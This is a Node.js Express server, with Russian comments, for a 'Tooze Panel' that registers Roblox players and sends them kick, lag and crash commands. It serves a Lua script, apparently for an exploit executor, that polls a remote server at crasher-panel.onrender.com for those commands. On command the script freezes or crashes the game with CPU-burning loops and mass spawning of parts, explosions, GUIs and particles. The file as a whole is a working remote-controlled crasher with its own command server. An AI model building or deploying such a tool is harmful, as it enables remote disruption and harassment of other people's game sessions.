const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// === ХРАНИЛИЩЕ ===
const players = {};

// === РЕГИСТРАЦИЯ ===
app.get('/api/register', (req, res) => {
    const username = req.query.username;
    if (!username) return res.status(400).send('Username required');
    
    if (!players[username]) {
        players[username] = {
            command: null,
            lagActive: false
        };
        console.log(`✅ Игрок зарегистрирован: ${username}`);
    }
    res.send('OK');
});

// === СПИСОК ИГРОКОВ ===
app.get('/api/players', (req, res) => {
    const playerList = Object.keys(players).map(name => ({
        username: name,
        lagActive: players[name].lagActive || false
    }));
    res.json(playerList);
});

// === ОТПРАВКА КОМАНДЫ ===
app.post('/api/command', (req, res) => {
    const { username, command, value } = req.body;
    
    if (!username || !command) {
        return res.status(400).json({ error: 'Username and command required' });
    }
    
    if (!players[username]) {
        return res.status(404).json({ error: 'Player not found' });
    }
    
    players[username].command = command;
    
    if (command === 'lag' && value !== undefined) {
        players[username].lagActive = value;
    }
    
    console.log(`📨 Команда "${command}" отправлена игроку ${username}`);
    res.json({ success: true, command, player: username });
});

// === ПОЛУЧЕНИЕ КОМАНД ДЛЯ ИГРОКА ===
app.get('/api/get_commands', (req, res) => {
    const username = req.query.username;
    
    if (!username || !players[username]) {
        return res.send('');
    }
    
    const command = players[username].command || '';
    players[username].command = null;
    
    res.send(command);
});

// === ОСНОВНОЙ СКРИПТ С УЛУЧШЕННЫМИ ФУНКЦИЯМИ ===
app.get('/api/get_exec_script', (req, res) => {
    const mainScript = `
-- ============================================
-- TOOZE PANEL v5 - УЛУЧШЕННЫЙ
-- ============================================

local serverUrl = _G.ToozeServer or "https://crasher-panel.onrender.com"
local player = game.Players.LocalPlayer

if not player then return end

local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")

-- === РЕГИСТРАЦИЯ ===
local function register()
    pcall(function()
        game:HttpGet(serverUrl .. "/api/register?username=" .. player.Name)
    end)
end

-- === LAG ENGINE - 1 FPS (УЛУЧШЕННЫЙ) ===
local lagActive = false
local lagConnections = {}
local lagThreads = {}

local function startLag()
    if lagActive then return end
    lagActive = true
    
    -- Метод 1: Блокировка RenderStepped
    local conn1 = RunService.RenderStepped:Connect(function()
        while lagActive do
            local start = os.clock()
            while os.clock() - start < 0.99 do
                -- Пустой цикл для блокировки
            end
            task.wait()
        end
    end)
    table.insert(lagConnections, conn1)
    
    -- Метод 2: Нагрузка на CPU через Heartbeat
    local conn2 = RunService.Heartbeat:Connect(function()
        if lagActive then
            for i = 1, 10000 do
                local _ = math.sin(i) * math.cos(i) * math.tan(i)
            end
        end
    end)
    table.insert(lagConnections, conn2)
    
    -- Метод 3: Спавн частей для нагрузки на рендеринг
    task.spawn(function()
        while lagActive do
            for i = 1, 500 do
                local part = Instance.new("Part")
                part.Size = Vector3.new(1, 1, 1)
                part.CFrame = CFrame.new(math.random(-1000, 1000), -9999, math.random(-1000, 1000))
                part.Parent = Workspace
                task.defer(function() part:Destroy() end)
            end
            task.wait(0.1)
        end
    end)
    
    -- Метод 4: Изменение настроек рендеринга
    task.spawn(function()
        while lagActive do
            pcall(function()
                if setfpscap then setfpscap(1) end
                -- Если есть доступ к QualitySettings
                if game:GetService("UserSettings") then
                    game:GetService("UserSettings").GameSettings:SetValue("GraphicsMode", 1)
                end
            end)
            task.wait(0.1)
        end
    end)
end

local function stopLag()
    lagActive = false
    
    for _, conn in ipairs(lagConnections) do
        pcall(function() conn:Disconnect() end)
    end
    lagConnections = {}
    
    pcall(function()
        if setfpscap then setfpscap(240) end
    end)
end

-- === CRASH - ПОЛНАЯ ЗАМОРОЗКА (УЛУЧШЕННЫЙ) ===
local function freezeGame()
    local crashThreads = {}
    
    -- 1. МАССИВНЫЙ СПАВН ЧАСТЕЙ
    task.spawn(function()
        for i = 1, 10000 do
            local part = Instance.new("Part")
            part.Size = Vector3.new(50, 50, 50)
            part.CFrame = CFrame.new(
                math.random(-5000, 5000),
                math.random(0, 5000),
                math.random(-5000, 5000)
            )
            part.Anchored = true
            part.Material = Enum.Material.Neon
            part.Parent = Workspace
            if i % 100 == 0 then task.wait() end
        end
    end)
    
    -- 2. БЕСКОНЕЧНЫЙ ЦИКЛ НАГРУЗКИ CPU
    task.spawn(function()
        while true do
            for i = 1, 100000 do
                local _ = math.sqrt(i) * math.sin(i) * math.cos(i)
                for j = 1, 100 do
                    local __ = _ * j / (j + 1)
                end
            end
            task.wait()
        end
    end)
    
    -- 3. БЛОКИРОВКА RENDERSTEPPED
    task.spawn(function()
        local conn = RunService.RenderStepped:Connect(function()
            local start = os.clock()
            while os.clock() - start < 0.99 do end
        end)
        table.insert(crashThreads, conn)
    end)
    
    -- 4. СПАВН ЭКСПЛОЗИЙ
    task.spawn(function()
        while true do
            for i = 1, 50 do
                local exp = Instance.new("Explosion")
                exp.Position = Vector3.new(
                    math.random(-2000, 2000),
                    math.random(0, 500),
                    math.random(-2000, 2000)
                )
                exp.BlastRadius = 100
                exp.BlastPressure = 1000000
                exp.Parent = Workspace
            end
            task.wait(0.01)
        end
    end)
    
    -- 5. СПАВН ГУИ ДЛЯ НАГРУЗКИ UI
    task.spawn(function()
        for i = 1, 500 do
            local gui = Instance.new("ScreenGui")
            gui.Parent = player.PlayerGui
            
            for j = 1, 20 do
                local frame = Instance.new("Frame")
                frame.Size = UDim2.new(0.1, 0, 0.1, 0)
                frame.Position = UDim2.new(math.random(), 0, math.random(), 0)
                frame.BackgroundColor3 = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))
                frame.Parent = gui
            end
            if i % 10 == 0 then task.wait() end
        end
    end)
    
    -- 6. СПАМ ЭМИТТЕРОВ ЧАСТИЦ
    task.spawn(function()
        while true do
            for i = 1, 30 do
                local emitter = Instance.new("ParticleEmitter")
                emitter.Rate = 100000
                emitter.Lifetime = NumberRange.new(10)
                emitter.SpreadAngle = Vector2.new(360, 360)
                emitter.Parent = Workspace.Terrain or Workspace
                task.defer(function() emitter:Destroy() end)
            end
            task.wait(0.02)
        end
    end)
    
    -- 7. ИЗМЕНЕНИЕ ОСВЕЩЕНИЯ
    task.spawn(function()
        while true do
            Lighting.Brightness = math.random()
            Lighting.ClockTime = math.random(0, 24)
            Lighting.FogEnd = math.random(0, 1000)
            Lighting.OutdoorAmbient = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))
            task.wait(0.01)
        end
    end)
end

-- === ОБРАБОТКА КОМАНД ===
local function checkCommands()
    local success, response = pcall(function()
        return game:HttpGet(serverUrl .. "/api/get_commands?username=" .. player.Name)
    end)
    
    if not success then return end
    
    if response == "kick" then
        player:Kick("Вас кикнули через Tooze Panel")
    elseif response == "crash" then
        freezeGame()
    elseif response == "lag" then
        if lagActive then
            stopLag()
        else
            startLag()
        end
    end
end

-- === ЗАПУСК ===
register()

while task.wait(2) do
    checkCommands()
end
    `;
    
    res.setHeader('Content-Type', 'text/plain');
    res.send(mainScript);
});

// === СТАТУС ===
app.get('/api/status', (req, res) => {
    res.json({ 
        status: 'online', 
        players: Object.keys(players).length,
        uptime: process.uptime()
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер Tooze запущен!`);
    console.log(`📍 Порт: ${PORT}`);
});

app.use((err, req, res, next) => {
    console.error('❌ Ошибка сервера:', err);
    res.status(500).json({ error: 'Internal server error' });
});
